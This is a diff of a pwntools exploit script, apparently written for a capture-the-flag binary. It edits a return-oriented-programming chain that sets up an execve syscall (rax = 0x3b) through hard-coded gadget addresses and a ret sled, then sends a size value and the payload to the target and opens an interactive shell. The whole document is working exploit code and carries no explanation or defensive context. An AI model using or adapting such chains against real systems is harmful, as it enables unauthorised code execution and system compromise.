@@ -18,7 +18,7 @@ def main():
     r = conn()
 
     p = ''
-
+    p += p64(0x0000000000400416) * 13 # ret 
     p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
     p += pack('<Q', 0x00000000006b90e0) # @ .data
     p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
@@ -37,70 +37,12 @@ def main():
     p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
     p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
     p += p64(0x3b)
-    '''
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
-    '''
     p += pack('<Q', 0x000000000047b6bf) # syscall
+    p += "\x00"
 
-    print len(p)
+    #gdb.attach(r, gdbscript = 'b *0x400baf')
+    r.sendline("257")
+    r.sendline(p)
     r.interactive()
 
 
